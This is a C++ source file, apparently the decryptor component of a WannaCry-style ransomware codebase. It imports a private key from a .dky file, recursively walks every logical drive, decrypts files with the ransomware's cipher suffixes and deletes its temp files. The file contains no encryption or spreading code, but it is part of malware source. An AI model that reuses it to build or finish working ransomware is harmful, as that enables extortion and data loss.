#include <shlobj.h>
#include "WanaFile.h"
#include "WanaDecryptor.h"
#include "../config.h"
#include "FileList.h"

WanaDecryptor::WanaDecryptor()
{
	m_pWanaZip = NULL;
}

WanaDecryptor::~WanaDecryptor()
{
	if (m_pWanaZip) {
		delete m_pWanaZip;
		m_pWanaZip = NULL;
	}
}

BOOL WanaDecryptor::InitWanaZip(DWORD nKeyNo)
{
	TCHAR szDKYFile[MAX_PATH + 1];
	BOOL bResult = FALSE;
	if (m_pWanaZip) {
		return TRUE;
	}
	GetDkyFileName(szDKYFile);
	if (GetFileAttributes(szDKYFile) !=
		INVALID_FILE_ATTRIBUTES) {
		m_pWanaZip = new WanaZip();
		bResult = m_pWanaZip->ImportPrivateKey(szDKYFile);
		if (!bResult) {
			DEBUG("Import %s error\n", szDKYFile);
		}
	}
	return bResult;
}

BOOL WanaDecryptor::DecryptTraverse(LPCTSTR pPathName)
{
	WIN32_FIND_DATA FindFileData;
	TCHAR szDir[MAX_PATH];
	TCHAR szPath[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	if (_tcslen(pPathName) > (MAX_PATH - 3))
	{
		DEBUG("\nDirectory path is too long %d.\n",
			(int)_tcslen(pPathName));
		return FALSE;
	}
	_stprintf_s(szDir, MAX_PATH, _T("%s\\*"), pPathName);
	hFind = FindFirstFile(szDir, &FindFileData);
	DEBUG("Enter dir %s\n", pPathName);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			return FALSE;
		}
		DEBUG("FindFirstFile Error: %d %s\n", GetLastError(), szDir);
		return FALSE;
	}
	do
	{
		if (_tcscmp(FindFileData.cFileName, _T(".")) &&
			_tcscmp(FindFileData.cFileName, _T(".."))) {
			if (_tcslen(pPathName) + 1 +
				_tcslen(FindFileData.cFileName) > (MAX_PATH - 3))
			{
				DEBUG("\nDirectory path is too long: %s\n",
					FindFileData.cFileName);
				return FALSE;
			}
			_stprintf_s(szPath, MAX_PATH,
				_T("%s\\%s"), pPathName, FindFileData.cFileName);
			if (FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_DIRECTORY)
			{
				if (_tcscmp(FindFileData.cFileName, _T(".")) &&
					_tcscmp(FindFileData.cFileName, _T(".."))) {
					if (!isIgnorePath(szPath, FindFileData.cFileName)) {
						DecryptTraverse(szPath);
					}
				}
			}
			else if (!(FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_READONLY))
			{
				LPTSTR pSuffix = (LPTSTR)_tcsrchr(
					FindFileData.cFileName, _T('.'));
				if (pSuffix) {
					if (!_tcsicmp(pSuffix, WZIP_SUFFIX_CIPHER) ||
						!_tcsicmp(pSuffix, WZIP_SUFFIX_WRITESRC)) {
						DEBUG("Decrypt file %s\n", szPath);
						if (!InitWanaZip(0)) {
							DEBUG("Import error\n");
							return FALSE;
						}
						m_pWanaZip->Decrypt(szPath);
					}
					else if (!_tcsicmp(pSuffix, WZIP_SUFFIX_TEMP)) {
						DEBUG("Delete file %s\n", szPath);
						DeleteFile(szPath);
					}
				}
			}
		}
	} while (FindNextFile(hFind, &FindFileData) != 0);
	FindClose(hFind);
	return TRUE;
}

BOOL WanaDecryptor::Decrypt(LPCTSTR pPath)
{
	DWORD attr;
	DEBUG("Decrypting %s\n", pPath);
	if ((attr = GetFileAttributes(pPath)) ==
		INVALID_FILE_ATTRIBUTES) {
		DEBUG("Can't get attributes of %s\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_READONLY) {
		DEBUG("%s is read only\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_DIRECTORY) {
		DecryptTraverse(pPath);
	}
	else {
		if (!InitWanaZip(0)) {
			DEBUG("Import error\n");
			return FALSE;
		}
		DEBUG("Decrypt file %s\n", pPath);
		return m_pWanaZip->Decrypt(pPath);
	}
	return TRUE;
}

BOOL WanaDecryptor::DecryptAll()
{
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	DWORD Drives = GetLogicalDrives();
	for (int DiskNO = 25; DiskNO >= 0; DiskNO--) {
		Drives = GetLogicalDrives();
		szRootPathName[0] = DiskNO + 65;
		if ((Drives >> DiskNO) & 1) {
			Decrypt(szRootPathName);
		}
	}
	return TRUE;
}
